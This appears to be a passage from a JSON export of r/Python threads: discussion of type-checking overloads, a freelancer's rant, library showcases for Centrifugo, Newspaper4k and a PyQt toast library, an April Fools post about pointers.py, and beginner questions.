                                    "content": "Yes agreed with all your points. Any function which returns a different type based on the input arguments smells bad to me (excluding cases where the different return types have a common base class, as is the case with boto3.client(), or cases where the return type can be None). But this got me thinking, maybe there is a use for a combination of overload and singledispatch? It would basically work like singledispatch but without the base function which raises NotImplementedError. E.g. @overload_dispatch def f(x: str) -> int: return 1 @overload_dispatch def f(x: int) -> str: return 'a' This way, the type-hints help the function author and the function user equally. Whereas currently, overload only really helps the function user with type-checking, and singledispatch only helps the author."
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "latkde",
            "score": "8",
            "content": "Correct, Python's static type system is unsound. Python's types do not guarantee the absence of certain bugs like sound static type systems would, but can be used quite effectively to detect some problems via static analysis. They are also fantastic in their role of enabling type-based autocompletion in LSP/IDEs. Your overload annotations present a contract to the caller but are not used to constrain your implementation – they are wrong, and tools will not warn about this. A Python typing trap I've sometimes encountered is that generic types are erased during runtime. Your rules disallow Any, but Any types can occur implicitly. For example: x = ...  # unknown type assert isinstance(x, dict) # x now has type dict[Any, Any] y = x[\"foo\"]  # y: Any An explicit Any may be strictly necessary in some generic parameters, e.g. for the yield and send types of Coroutine objects. Some widely used frameworks such as Pytest are untyped and fundamentally cannot be typed. I can write a test case with explicit type annotations, but they need not match the fixture that is used to fill them: @pytest.fixture def foo() -> int: return 42 def test_something(foo: str) -> None: assert type(foo) == str  # nope, actually is int Similarly, FastAPI dependency injection cannot be typechecked: def foo() -> int: return 42 @app.get(\"/foo\") def get_foo(foo: Annotated[str, Depends(foo)]) -> JSONResponse: # annotated as `foo: str` but will actually receive an int ... The Depends(foo) is an annotation that is ignored during type-checking, but inspected by FastAPI using reflection. Python's type system offers no way to automatically obtain the foofunction's return type for the annotation. Ideally, something like this would work: def TypedDepends[R](dependency: Callable[..., R]) -> type[R]: ... @app.get(\"/foo\") def get_foo(foo: TypedDepends(foo)) -> JSONResponse: # type-checked as get_foo(foo: int) ... However, type annotations cannot feature run-time code and may only use ordinary types and special forms that the type checker knows about (e.g. Unions). So Python's type system is great at preventing many common bugs, but cannot provide safety in the face of some more complicated patterns (including implementing an overloaded function)."
        },
        {
            "author": "[deleted]",
            "score": "",
            "content": "I kinda thought this was silly at first but he's not wrong. The overload said that if a str enters, an int comes out. Mypy knows this but didn't evaluate the content of the main function VS its overloads. Mypy is perfectly able to make type assertions and point out that you're returning a wrong type. In this case it uses the current function signature instead of evaluating the overloads. That does feel like a bug (or a non implemented feature) in mypy.",
            "replies": [
                {
                    "author": "muikrad",
                    "score": "2",
                    "content": "I kinda thought this was silly at first but he's not wrong. The overload said that if a str enters, an int comes out. Mypy knows this but didn't evaluate the content of the main function VS its overloads. Mypy is perfectly able to make type assertions and point out that you're returning a wrong type. In this case it uses the current function signature instead of evaluating the overloads. That does feel like a bug (or a non implemented feature) in mypy."
                }
            ]
        },
        {
            "author": "mattl33",
            "score": "1",
            "content": "This seems like very niche and complicated code. Why would you ever do this?",
            "replies": [
                {
                    "author": "muikrad",
                    "score": "1",
                    "content": "It simplifies the code elsewhere."
                }
            ]
        },
        {
            "author": "MeGaNeKoS",
            "score": "0",
            "content": "It because python use your overload to check it. Just like in other language, overload is use to indicate that dev can guarantee when the function give with parameter/type x, will return result with type y. Therefore, python and other language, typecheck will prioritize this definiition, so it cant catch any implementation error on the actual code. Here the same implementation on typescript, yet it didnt detect any error. function f(x: number): string; function f(x: string): number; function f(x: number | string): number | string { if (typeof x === \"number\") { return 1; } else { return 'a'; } } // This function to ensure both type same since \"+\" didnt do type checking in ts function add(a: string, b: string):number function add(a: number, b: number):number function add(a: string |number, b: string | number): number{ return 0 } console.log(add(1, f(\"a\"))); console.log(add(\"a\", f(1)));"
        },
        {
            "author": "FailedPlansOfMars",
            "score": "-1",
            "content": "In a static typed language like java the type checking wouldnt let you return the str or int from a function. And the type system is used to control errors at run time. Python is duck typed, the type system at runtime is if it has methods with the same name and args it matches. This gives it the ability to have some type safety but not much. The typing system you use in code with return values are type hints and only for the developer to avoid mistakes. They should be treated as documentation rather than runtime constraints. So no its not broken your just using advice and guidelines and assuming it's enforced.",
            "replies": [
                {
                    "author": "muikrad",
                    "score": "3",
                    "content": "Duck typing is an old way of doing thing that really didn't evolve well at all. What you're saying isn't wrong but it's not how typical python is written nowdays. OP is right and there are 2 bugs about this in mypy to catch it correctly."
                },
                {
                    "author": "Rawing7",
                    "score": "2",
                    "content": "This has nothing to do with duck typing, it's an issue with static type checkers. Type checkers are supposed to detect when your type annotations don't match reality (i.e. runtime), but in this case they don't."
                }
            ]
        }
    ]
},
{
    "post_author": "anyfactor",
    "post_id": "jm9dnh",
    "post_score": "1638",
    "post_time": "Sunday, November 1, 2020 at 11:27:49 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "[RANT] Clients telling me \"I know python\" is a major red flag to me",
    "media": [],
    "post_content": "I do freelance python development in mainly web scraping, automation, building very simple Flask APIs, simple Vue frontend and more or less doing what I like to call \"general-purpose programming\".\nNow, I am reasonably skilled in python, I believe. Don't write OOP and class-based python unless I am doing more than 100 lines of code. Most often write pretty simple stuff but most of the time goes into problem-solving.\nBut I despise freelancing. 1 out of every 3 comments/posts I make on Reddit is how much I hate doing freelancing. I come to Reddit to vent so I am sorry to the fellas who is reading this because they are more or less my punching bag :( I am sorry sir/madam. I am just having a bad life, it will end soon.\nSo, today I am going to rant about one of the more \"\"fun\"\" things of freelancing, client telling me they know python.\nWhenever a client tells me that they know python, I try to ignore them but often times I have to entertain the idea anyway because jobs are scarce. I keep telling myself \"maybe this will work out great\" but it doesn't.\nIt never goes right. Here is the thing. If you do what I do you will realize the code is often quite simple. Most of the effort goes into problem-solving. So when the client sees the code and me getting paid by the hour, \"They are like I thought you are best darn python developer I could have written that myself!\"\nMy immediate impulse is to go on a rant and call that person something rotten. But I have to maintain \"professionalism\".\nThen there is the issue of budgeting. I do fixed payment contracts for smaller engagements. But oftentimes these python experts will quote me something that is at least one-fourth of a reasonable budget. And by reasonable I mean non-US reasonable budget which is already one-fifth of a reasonable US programming project budget. But anyway they quote that because they know how is easy it is to do my job.\nThere is more because this is rant by the way. So, clients with python knowledge will say to me \"I have this python file...\" which is the worst thing to say at this point. They think they have done the \"majority\" of the work. But here is the way I see it-\na. Either they have just barely scratched the surface b. They have a jumbled up mess c. They had another dev look into the project who already failed d. They had to do a \"code review\" of their previous freelancer and they ended up stealing the code\nThere is no positive way to imagine this problem. I have seen too much crappy code and too much of arguments like \"they had done the work for me, so I should charge near to nothing\".\nPeople don't know exactly why senior devs get paid so much money. Junior devs write code, senior devs review code. That is why they get paid more. Making sense of other people's code is a risky and frustrating thing and it could be incredibly time-consuming. And moreover in most cases building upon a codebase is more difficult than writing it from the scratch.\nDoctors rant about \"expert\" patients earning their MDs from WebMD and I am seeing the exact same thing happen to me with clients knowing how to write loops in python.\nPython is easy to learn, programming these days is easy to learn. But people are not paying programmers for writing loops and if statements. They are paying them to solve problems. Knowing the alphabet doesn't make you a poet. And yes in my eyes programming is poetry.",
    "comments": [
        {
            "author": "Config_Crawler",
            "score": "779",
            "content": "TL;DR -- Knowing syntax doesn't mean you are a replacement for hiring a skilled programmer, or should talk down to said hired skilled programmer. Knowing syntax helps, but the logic in programs is where the heavy-lifting is.",
            "replies": [
                {
                    "author": "mattf",
                    "score": "268",
                    "content": "I'd go one further: an expert will come up with what looks like an obvious and simple solution... because simplicity is a design goal. That's why they're good: they come up with the best/simplest/most-sustainable solution. Of COURSE it seems obvious after someone else has figured it out. Fancy, complex code is often a sign of a brittle solution. Especially with python, clever code is an anti-pattern.",
                    "replies": [
                        {
                            "author": "cultoftheilluminati",
                            "score": "35",
                            "content": "IMO this is the same thing between seeing art and recognising it and actually creating that piece of art. Just because you can realise that something looks beautiful doesn’t mean that you can create it. The same goes with music for instance"
                        },
                        {
                            "author": "energybased",
                            "score": "48",
                            "content": "Exactly, design is the \"heavy-lifting\". That's what takes years of experience, and learning from poor designs."
                        }
                    ]
                },
                {
                    "author": "ultratensai",
                    "score": "24",
                    "content": "Yes exactly. I’m in a networking field and most of my codes are just “hacks” to get things done. They are badly designed to scale or re-use for other tasks. The hardest part of the programming is to come up with a proper design/solutions."
                },
                {
                    "author": "Log2",
                    "score": "3",
                    "content": "Another thing most people fail to realize is that a skilled programmer is probably not writing a lot of lines of code to solve a problem, or at least writing a lot less than amateur programmers would expect. Especially as many of the common programming languages get more and more quality of life updates and quality libraries, you can do a lot with very little code of your own."
                },
                {
                    "author": "[deleted]",
                    "score": "-268",
                    "content": "",
                    "replies": [
                        {
                            "author": "RickSore",
                            "score": "6",
                            "content": "With your edit, it's now easier to see your point (being that knowing syntax vs knowing how to apply it). Just unfortunate wording."
                        }
                    ]
                }
            ]
        },
        {
            "author": "DauntlessVerbosity",
            "score": "215",
            "content": "I decided to browse freelancing jobs last night. Most of what is out there is bizarre. People want to pay $19 for something that will take weeks to develop or $10/hr for entire complicated pieces of software that would take an entire experienced team some time. $10/hr is less than minimum wage where I am. McDonalds pays more. And then there are those posts looking for someone who is an expert in 10 different languages that was written by someone who clearly has no idea what they're talking about or what the words they're using mean. It's like those people looking for freelancing game devs who want you to spend 2 years building a game for them and, instead of paying you, will let you share the profits if the game sells. But they're sure their game will sell because they have the \"best\" idea ever with their zombie football light saber MMO. If someone would only magically live on no income for years for them, surely the game will sell and we'll all be rich... I get that you want to stay professional, but you can respectfully remind them that if they could do it, they wouldn't have to hire someone. Maybe add that if they don't need you, you can move on to your next project, to remind them that they're back to their own devices without help if they can't treat you well."
        },
        {
            "author": "standardtrickyness1",
            "score": "136",
            "content": "Ask them why they're hiring you then."
        },
        {
            "author": "BobBeaney",
            "score": "54",
            "content": "Strangers are bad enough, but friends are worse. Friend : “hey I’ve got a great idea for a website. I’ll tell you my idea, you make the website, then we’ll split the profits 50-50.” Yeah, fuck that."
        },
        {
            "author": "Username_RANDINT",
            "score": "90",
            "content": "Not related to the topic, but I'd like to pick out this line: Don't write OOP and class-based python unless I am doing more than 100 lines of code. This sounds like a weird way of thinking to me. Just use classes when they're needed. That can be at 30 lines of code, 400 lines or never. Using them at some set amount of lines, to organise code or so presumably, doesn't suddenly make them the right choice."
        },
        {
            "author": "DonKosak",
            "score": "41",
            "content": "People (both customers and consultants) need to understand the difference between actual professional work and \"I watched a video and can look things up on stack exchange.\" Actual professional code: Is robust -- fails gracefully and has solid error handling Has tests -- even 1 a one page \"screen scrapper\" program can have a test unit (probably a paragraph of code) to scrape a test page Is documented -- both for the user, and for developers looking at it later. Is maintainable -- \"DRY\" (no chunks of copy-paste), consistent, modular, well defined minimal interfaces between code units, etc. If a client says, \"I could have written this!\" and your code is cut and paste crap with no error handling, no tests, no docs -- then, yeah the problem is you. If on the other hand, your code is really professional grade, then have patience, and help your client understand the value you're bringing."
        },
        {
            "author": "dratnon",
            "score": "165",
            "content": "I am just having a bad life, it will end soon. You okay? Want to rant some more?"
        },
        {
            "author": "zeroviral",
            "score": "20",
            "content": "I hear your pain. As a senior software engineer myself, we don’t necessarily get paid more because we only review code, we also have some other key attributes across the board: Ability to find solutions on your own Reporting progress to upper management and also keeping tabs on juniors who may not have the right resources or understand how to access them to achieve the right job. Senior engineers generally do code, with most managers not coding. It is still an IC role in most companies. Senior engineers have learned from their mistakes (mostly) and can see beyond the engineering complexity that junior engineers lack. They are able to make decisions for architecture, infrastructure, design patterns etc much more fluidly and efficiently based on the past experiences."
        },
        {
            "author": "dfreinc",
            "score": "46",
            "content": "If they're a python programmer then they wouldn't be hiring you. I get jobs are scarce but I doubt I'd be able to stop myself from saying things like 'do it yourself or keep it to yourself'. My inability to do that is probably why they don't put me in front of clients at work. 🤷‍♀️"
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1bue638",
    "post_score": "3",
    "post_time": "Wednesday, April 3, 2024 at 3:00:09 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Wednesday Daily Thread: Beginner questions",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "Due_Swing_2282",
            "score": "2",
            "content": "If you install Anaconda or Miniconda, it installs xz 5.4.6. Now that version is currently not known to have been exploited, but Jia Tan has been the maintainer since version 5.3, and has hundreds of commits between 5.3 and 5.4.6, several of these with large amounts of suspicious code. There are security researchers going through the code, but there could be sneaky and very hard to detect backdoors. What should Python developers do to protect themselves?"
        },
        {
            "author": "SliverThumbOuch",
            "score": "1",
            "content": "I am not very experienced. I’ve been installing various local AI modules such as SD, Local LLM etc. I’ve had no issues up until I followed a tutorial without reading the sub description noting that the tutorial was specifically for AMD cards. I have a Nvidia GPU. I believe I made a change to my environment during the install of the requirements.txt or some other pull. Now all git installs/ pulls are auto installing for win_amd64. Also, when I select GPU installers it errors with something like the python environment doesn’t match. Python is up to date. Is there a way to change back my environment? (The tutorial was done in anaconda). Please help a noob out 🙏"
        }
    ]
},
{
    "post_author": "FZambia",
    "post_id": "1bnlllg",
    "post_score": "5",
    "post_time": "Monday, March 25, 2024 at 9:53:50 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Astrologers have announced the month of Python in Centrifugal Labs: real-time libraries and tutorial",
    "media": [
        "https://centrifugal.dev/blog/2020/11/12/scaling-websocket",
        "https://github.com/centrifugal/centrifuge-python",
        "https://github.com/dunglas/mercure",
        "https://centrifugal.dev/docs/tutorial/intro",
        "https://ably.com/",
        "https://pubnub.com/",
        "https://github.com/centrifugal/centrifugo",
        "https://pusher.com/",
        "https://centrifugal.dev/docs/getting-started/comparisons",
        "https://github.com/centrifugal/pycent"
    ],
    "post_content": "Hello Python community. My name is Alexander – I am the author of Centrifugo project. It's a self-hosted real-time messaging server (alternative to Ably, Pusher, Pubnub services). It was written in Python originally, but then migrated to Go. But it's fully language-agnostic and helps many projects written in Python (and in Django in particular) to add real-time updates to the application. Centrifugo is quite fast, scales well, has super-efficient integration with Redis (~million of publications per second, and more with Redis sharding/Redis Cluster).\nWhat My Project Does\nAny kind of real-time messaging apps may be built with the help of Centrifugo. Chat/messenger apps, real-time multiplayer games, turn-based games in particular. Streaming metrics. The best thing is that Centrifugo is a separate language-agnostic service which provides API for client connections (WebSocket, EventSource, HTTP-streaming, experimental Webtransport, GRPC) and for backend communication (over HTTP or GRPC). So it may be used as a universal real-time component throughout different tech stacks. Including Python. Centrifugo is used in many projects, for example, our core WebSocket library is part of Grafana.\nTarget Audience\nSoftware engineers, startups and mature projects that require real-time updates in the application. Centrifugo gives answers to some problems developers may come across when building real-time app in scale. See our blog post: Scaling WebSocket in Go and beyond.\nComparison\nThere is no direct analogue, but many projects exist in the area. Some of them cloud-based - like pusher.com, ably.com, pubnub.com. Some are self-hosted - like Mercure. We have comparison with similar technologies on Centrifugo site. I'd say Protobuf protocol, transport selection, both bidirectional and unidirectional approaches, super-efficient built-in Redis integration for scalability are some selling points of Centrifugo when comparing to other self-hosted solutions.\nThe actual update\nDuring last month Centrifugal ecosystem got several Python updates, and I'd like to share this with you:\nWe've released Python real-time SDK for Centrifugo. See centrifuge-python. This is a WebSocket client, uses JSON or Protobuf for communicating with Centrifugo. Real-time SDKs usually used on client-side of app - it's possible to subscribe/unsubscribe on channels, receive online presence data, communication with the backend over RPC calls through WebSocket.\nNext library we just released is pycent v5, HTTP SDK for Centrifugo server API. Most of the time you publish real-time data to Centrifugo channels you are using server API, and this is a small lib that simplifies integration with Centrifugo. It has both sync and async clients, uses Pydantic for DTO.\nFinally, not exactly generic Python related, but I'd like to mention it also because we've put a lot of effort into it. We've released a Grand Tutorial for Centrifugo which shows how to build scalable chat/messenger application on top of Django and Centrifugo. From scratch. It covers some aspects of application building other tutorials never mention - delivery guarantees, approaches for reliable delivery and idempotent processing, shows some numbers.\nHope this may be useful to someone in the community. Since Centrifugo has roots in Python a good integration with the ecosystem is very important for us. If you have any questions about a project – will be happy to answer.",
    "comments": [
        {
            "author": "123_alex",
            "score": "8",
            "content": "Came here for the astrology. I'm disappointed.",
            "replies": [
                {
                    "author": "Cultys",
                    "score": "2",
                    "content": "Came here for laboratory centrifuges. I'm disappointed."
                },
                {
                    "author": "Only-Trick2090",
                    "score": "1",
                    "content": "Came here for a Python project. I'm disappointed."
                }
            ]
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1bph9qb",
    "post_score": "6",
    "post_time": "Thursday, March 28, 2024 at 3:00:07 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Thursday Daily Thread: Python Careers, Courses, and Furthering Education!",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "Simonaque",
            "score": "1",
            "content": "Hi, I just finished Fluent Python 2nd Edition and i'm looking to learn more about Python tooling, packaging, the wheel, etc. Does anyone know of any good resources?"
        }
    ]
},
{
    "post_author": "Narthal",
    "post_id": "gc691l",
    "post_score": "1686",
    "post_time": "Saturday, May 2, 2020 at 4:13:13 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "My experience learning Python as a c++ developer",
    "media": [],
    "post_content": "First off, Python is absolutely insane, not in a bad way, mind you, but it's just crazy to me. It's amazing and kind of confusing, but crazy none the less.\nRecently I had to integrate Python as a scripting language into a large c++ project and though I should get to know the language first. And let me tell you, it's simply magical.\n\"I can add properties to classes dynamically? And delete them?\" \"Functions don't even care about the number of arguments?\" \"Need to do something? There's a library for that.\"\nIt's absolutely crazy. And I love it. I have to be honest, the most amazing about this is how easy it is to embed.\nI could give Python the project's memory allocator and the interpreter immediately uses the main memory pool of the project. I could redirect the interpreter's stdout / stderr channels to the project as well. Extending the language and exposing c++ functions are a breeze.\nPython essentially supercharges c++.\nNow, I'm not going to change my preference of c/c++ any time soon, but I just had to make a post about how nicely Python works as a scripting language in a c++ project. Cheers",
    "comments": [
        {
            "author": "NemexiaM",
            "score": "597",
            "content": "Unfortunately this made me so lazy that i dont want to go back to C++",
            "replies": [
                {
                    "author": "lucidguppy",
                    "score": "176",
                    "content": "C++ should be applied in the cases where it needs to be. If your python spitball solution is taking days, weeks, or months - and a good attempt at optimization isn't working - you need to find out where C++ can be used.",
                    "replies": [
                        {
                            "author": "NemexiaM",
                            "score": "75",
                            "content": "Sure, but hasn't happened to me yet considering the fact that im a programming hobbyist",
                            "replies": [
                                {
                                    "author": "realXavie",
                                    "score": "19",
                                    "content": "It will happen one day. I heard that python is some kind of slow when you are developing an app wich needs speed to work efficiently. How do you escape such pitfall?"
                                }
                            ]
                        },
                        {
                            "author": "lenticularis_B",
                            "score": "3",
                            "content": "Yup thats what is did for my numerical simulator. Implemented iteration schemes in C, while using the other benefits from Python which is my preffered language. It's approx 100 times faster this way."
                        },
                        {
                            "author": "top_logger",
                            "score": "2",
                            "content": "The same situation with Python. Python should be applied in the cases where it needs to be."
                        },
                        {
                            "author": "NemexiaM",
                            "score": "1",
                            "content": "Sure, but hasn't happened to me yet considering the fact that im a programming hobbyist"
                        },
                        {
                            "author": "emsiem22",
                            "score": "1",
                            "content": "or months Maybe even earlier.",
                            "replies": [
                                {
                                    "author": "lucidguppy",
                                    "score": "6",
                                    "content": "Let it keep running while you try to optimize it. It may complete while you try to figure out c++"
                                }
                            ]
                        },
                        {
                            "author": "metriczulu",
                            "score": "1",
                            "content": "Honestly, there's at least 3 languages I'd burn through first before I tried to implement something in C/C++ unless it was something that is commonly done in C/C++ (and hence easier to implement since I can build on other's work)."
                        },
                        {
                            "author": "SnowdenIsALegend",
                            "score": "1",
                            "content": "Maybe GYB (Got Your Back) gmail backup & restore app needs this. Sitting here waiting for it to do a 15gb upload to my gmail account from an mbox file looks like it's going to take literally 22 hours or so.",
                            "replies": [
                                {
                                    "author": "abkfenris",
                                    "score": "12",
                                    "content": "Since GYB is communicating with a remote server, that is probably where the bottleneck is, rather than Python itself. In this case converting it to C++ or otherwise is unlikely to make any difference."
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "aufstand",
            "score": "151",
            "content": "Aah, it works the other way round, too. Many c++ libraries (Numpy, for example) extend Python in many interesting ways. That is why claims such as \"Python is slow\" don't have much hold in the community. One practical example: I recently decided to see if i can scale up my completely unoptimized LED-Matrix (40*16!) video mixer to FullHD. No problemo. It ate most of my RAM and kept a single core _very_ busy, but it was also realtime mixing and displaying 6 FullHD video streams, which i don't exactly consider \"slow\" :) Why is this possible? Well, yeah, i used numpy to mix the data!",
            "replies": [
                {
                    "author": "ReckingFutard",
                    "score": "57",
                    "content": "Pssst, check out pytorch. Numpy functions with GPU memory and parallelized computation."
                }
            ]
        },
        {
            "author": "Al2Me6",
            "score": "23",
            "content": "I thought cpp had variadic arguments as well"
        }
    ]
},
{
    "post_author": "ZeroIntensity",
    "post_id": "1bt7rnw",
    "post_score": "565",
    "post_time": "Monday, April 1, 2024 at 7:09:42 PM GMT+3",
    "flair_text": "News",
    "post_title": "pointers.py being added to the standard library!",
    "media": [
        "https://www.google.com/search?query=todays+date",
        "https://github.com/ZeroIntensity/pointers.py/"
    ],
    "post_content": "As of PEP 4124 being accepted, the infamous pointers.py will be added to Python's standard library in 3.13! To quote Guido van Rossum's take on adding this, \"Why the hell not?\"\nThis will also introduce pointer literals, the sizeof operator, and memory errors!\nfrom pointers import malloc\n\nptr = &\"spam\"  # Pointer literal\nprint(*ptr)\nmem = malloc(?\"hello\")  # New sizeof operator\nprint(*mem)  # MemoryError: junk 13118820 6422376 4200155 at 0x7649f65a9670\n# MemoryWarning: leak at 0x7649f65a9670\nHowever, it was decided in this discussion that segfaults would be added to the language for \"extra flavor\":\nspam = *None\n# Segmentation fault, core dumped. Good luck, kiddo.",
    "comments": [
        {
            "author": "RedEyed__",
            "score": "290",
            "content": "Nice one, I believed for a second!"
        },
        {
            "author": "ericmoon",
            "score": "136",
            "content": "I'm going back to bed. See y'all on the 2nd.",
            "replies": [
                {
                    "author": "mok000",
                    "score": "15",
                    "content": "But the post is up on the 2nd. And the 3rd, and 4th. It will be there f.o.r.e.v.e.r.",
                    "replies": [
                        {
                            "author": "mehedi_shafi",
                            "score": "11",
                            "content": "We'll reference this throughout the *datetime.now()",
                            "replies": [
                                {
                                    "author": "indistinctdialogue",
                                    "score": "2",
                                    "content": "Did you mean “dereference”?"
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "Ncientist",
            "score": "18",
            "content": "Darn, got me excited for a brief second and then I realized what’s happening. Still finishing my morning coffee. (Having more than one cup so that I can claim this!)"
        },
        {
            "author": "pkmnrt",
            "score": "17",
            "content": "PEP 4124, 04-01-2024 I see what you did there"
        },
        {
            "author": "DrTaxus",
            "score": "29",
            "content": "You got me"
        },
        {
            "author": "BeverlyGodoy",
            "score": "10",
            "content": "Wait for real? Oh 1st April. Goodnight guys."
        },
        {
            "author": "rapidDefrost",
            "score": "7",
            "content": "Shit it's the 1st April ... i should have read comments first 😂"
        }
    ]
},
{
    "post_author": "gringo6969",
    "post_id": "1bmtdy0",
    "post_score": "196",
    "post_time": "Sunday, March 24, 2024 at 10:40:12 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "I forked Newspaper3k, fixed bugs and improved its article parsing performance - Newspaper4k package",
    "media": [
        "https://newspaper4k.readthedocs.io/",
        "https://github.com/AndyTheFactory/newspaper4k",
        "https://github.com/AndyTheFactory/newspaper4k?tab=readme-ov-file#evaluation-results"
    ],
    "post_content": "Hi all!\nThe Newspaper3k is abandoned (latest release in 2018) without any upgrades and bugfixing.\nI forked it, and imported all open Issues into my repo. The first two releases (0.9.0 and 0.9.1) were mainly bugfixes and bringing the project more up to date and compatible with python > 3.6 (I started from version 0.9.0 😁). In the latest version, 0.9.3 I not only almost reworked the whole News article parsing process, but also added a lot of new supported languages (around 40 new languages)\nRepository: https://github.com/AndyTheFactory/newspaper4k\nDocumentation: https://newspaper4k.readthedocs.io/\nWhat My Project Does\nNewspaper4k helps you in extracting and curating articles from news websites. Leveraging automatic parsers and natural language processing (NLP) techniques, it aims to extract significant details such as: Title, Authors, Article Content, Images, Keywords, Summaries, and other relevant information and metadata from newspaper articles and web pages. The primary goal is to efficiently extract the main textual content of articles while eliminating any unnecessary elements or \"boilerplate\" text that doesn't contribute to the core information.\nTarget Audience\nNewspaper4k is built for developers, researchers, and content creators who need to process and analyze news content at scale, providing them with powerful tools to automate the extraction and evaluation of news articles.\nComparisons\nAs of the 0.9.3 version, the library can also parse the Google News results based on keyword search, topic, country, etc\nThe documentation is expanded and I added a series of usage examples. The integration with Playwright is possible (for websites that generate the content with javascript), and since 0.9.3 I integrated cloudscraper that attempts to circumvent Cloudflair protections.\nAlso, compared with the latest release of newspaper3k (0.2.8), the results on the Scraperhub Article Extraction Benchmark are much improved and the multithreaded news retrieval is now stable.\nPlease don't hesitate to provide your feedback and make use of it! I highly value your input and encourage you to play around with the project.",
    "comments": [
        {
            "author": "lpeg571",
            "score": "16",
            "content": "this seems wonderful, thank you!"
        },
        {
            "author": "runawayasfastasucan",
            "score": "9",
            "content": "Just wanted to say great job with this! Looks like a cool project as well!",
            "replies": [
                {
                    "author": "gringo6969",
                    "score": "4",
                    "content": "Thank you!"
                }
            ]
        },
        {
            "author": "MrKooops",
            "score": "7",
            "content": "Just switched to it for my rss reader project and it works like a charm, thank you! It you need help, give me a holler!"
        },
        {
            "author": "qa_anaaq",
            "score": "6",
            "content": "Very nice!"
        },
        {
            "author": "bisontruffle",
            "score": "5",
            "content": "I use 3k all the time, still works great mostly, going to try this! Thanks."
        },
        {
            "author": "VaguelyDancing",
            "score": "4",
            "content": "Awesome. Gonna update my projects!"
        },
        {
            "author": "sigbhu",
            "score": "3",
            "content": "does this work with sites other than news articles? can i use it as a general article extractor from a website?",
            "replies": [
                {
                    "author": "gringo6969",
                    "score": "5",
                    "content": "It works with other types of websites, for instance blogs, etc. It's a general content extractor. It is somehow optimized for news, at least in the way it has the information structured - title, authors, publishing date, content, etc. But you can for instance just ignore \"authors\" if it does not make sense for your implementation. What is more \"news site\"-centered is the \"category\" discovery. Where it tries to identify the news categories and their links. But if it does not apply to you, just use the content parsing part .. (Article object)"
                }
            ]
        },
        {
            "author": "ZucchiniMore3450",
            "score": "3",
            "content": "I found your version a couple of months ago and updated my project, it works beautifully. Thank you for your work!"
        }
    ]
},
{
    "post_author": "niklashnng",
    "post_id": "1bkx6uw",
    "post_score": "87",
    "post_time": "Friday, March 22, 2024 at 2:40:04 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "I made a free easy-to-use toast notification library for PyQt and PySide",
    "media": [
        "https://github.com/niklashenning/pyqt-toast/assets/58544929/f4d7f4a4-6d69-4087-ae19-da54b6da499d",
        "https://github.com/niklashenning/pyqt-toast"
    ],
    "post_content": "Hey guys,\nsince I couldn't find any good libraries for showing modern-looking toast notifications in PyQt, I made one myself.\nWhat My Project Does:\nIt supports showing multiple toasts at the same time, queueing of toasts, 6 different positions, multiple screens and much more. Since it's developed with QtPy, an abstraction layer for multiple versions of PyQt and PySide, you can use it with PyQt5, PyQt6, PySide2, and PySide6. Also, basically anything can be completely customized and it's extremely easy to use.\nTarget Audience:\nThis is useful for any Python developer who is working with PyQt or PySide and wants to display clean and modern-looking toast nofifications easily.\nComparison:\nSince I wasn't able to find any real libraries for PyQt toasts, I can't really give a comparison.\nPreview: https://github.com/niklashenning/pyqt-toast/assets/58544929/f4d7f4a4-6d69-4087-ae19-da54b6da499d\nGithub: https://github.com/niklashenning/pyqt-toast\nHope this helps :)",
    "comments": [
        {
            "author": "niklashnng",
            "score": "2",
            "content": "Thanks for the good feedback guys, I really appreciate it!"
        },
        {
            "author": "Hubi522",
            "score": "1",
            "content": "Cool, seems good"
        },
        {
            "author": "skratlo",
            "score": "1",
            "content": "Is this cross-platform?",
            "replies": [
                {
                    "author": "niklashnng",
                    "score": "1",
                    "content": "Yup, it works cross-platform just like PyQt / PySide"
                }
            ]
        },
        {
            "author": "PrometheusAlexander",
            "score": "1",
            "content": "Not bad at all."
        },
        {
            "author": "Guideon72",
            "score": "1",
            "content": "still haven't delved into using my own UIs much, yet, but this looks like it could be a solid addition to the arsenal. Will definitely be revisiting it in the future when I get started on that path."
        },
        {
            "author": "LinearArray",
            "score": "1",
            "content": "This is great! Good work."
        },
        {
            "author": "Gullible-Mobile-8638",
            "score": "1",
            "content": "Exactly what I was looking for whilst working on a recent project. Will give it a try."
        },
        {
            "author": "Acrobatic-Pop2490",
            "score": "1",
            "content": "Thanks a bunch for sharing this. I was looking for suach a library. Edit: I used the library and I can say it's such an invaluable piece of work! Thanks again!",
            "replies": [
                {
                    "author": "niklashnng",
                    "score": "1",
                    "content": "Thank you, I really appreciate it!"
                }
            ]
        }
    ]
},
{
    "post_author": "jrmiranda",
    "post_id": "gcra5c",
    "post_score": "1637",
    "post_time": "Sunday, May 3, 2020 at 5:14:07 PM GMT+3",
    "flair_text": "I Made This",
    "post_title": "I made a raytracer in Python from scratch!",
    "media": [
        "https://preview.redd.it/c40fzt4t5kw41.png?width=640&crop=smart&auto=webp&s=b09d47f8cd814f702620ec406a5942d28fdb63fa",
        "https://i.redd.it/c40fzt4t5kw41.png"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "ZDRuX1",
            "score": "256",
            "content": "... show-off Fine, maybe it's better than my rock, paper, scissors.",
            "replies": [
                {
                    "author": "Resolt",
                    "score": "110",
                    "content": "Strictly speaking his raytracer probably won't let you play rock paper scissors, so in that way your programs are just different :)",
                    "replies": [
                        {
                            "author": "[deleted]",
                            "score": "54",
                            "content": "who needs rock, paper, scissors, when you can play sphere, sphere sphere, sphere, sphere, sphere, sphere, sphere, sphere, sphere, sphere?"
                        },
                        {
                            "author": "[deleted]",
                            "score": "2",
                            "content": "Strictly speaking his raytracer probably won't let you play rock paper scissors, so in that way your programs are just different :) Oh yeah, but do your rock, paper or scissors go pew, pew, pew?"
                        }
                    ]
                },
                {
                    "author": "[deleted]",
                    "score": "",
